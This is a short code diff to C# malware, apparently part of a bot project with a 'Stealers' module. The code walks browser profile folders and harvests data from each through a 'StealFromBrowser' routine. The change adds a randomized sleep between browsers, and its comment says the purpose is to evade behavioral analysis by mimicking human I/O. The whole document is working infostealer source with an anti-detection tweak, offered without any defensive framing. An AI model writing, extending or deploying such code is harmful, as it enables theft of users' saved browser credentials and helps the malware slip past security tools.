@@ -27,6 +27,7 @@ namespace FinalBot.Stealers
         public async Task<string> RunAll()
         {
             var reports = new List<string>();
+            var rng = new Random();
             foreach (var browser in _browserPaths)
             {
                 string path = Path.Combine(_localAppData, browser.Value);
@@ -34,7 +35,7 @@ namespace FinalBot.Stealers
 
                 if (Directory.Exists(path))
                 {
-                    try 
+                    try
                     {
                         var report = await StealFromBrowser(browser.Key, path);
                         if (!string.IsNullOrEmpty(report)) reports.Add(report);
@@ -43,6 +44,8 @@ namespace FinalBot.Stealers
                     {
                         reports.Add($"❌ Error stealing from {browser.Key}: {ex.Message}");
                     }
+                    // Random delay to evade behavioral analysis (looks like human I/O)
+                    Thread.Sleep(rng.Next(150, 600));
                 }
             }
             return string.Join("\n\n", reports);
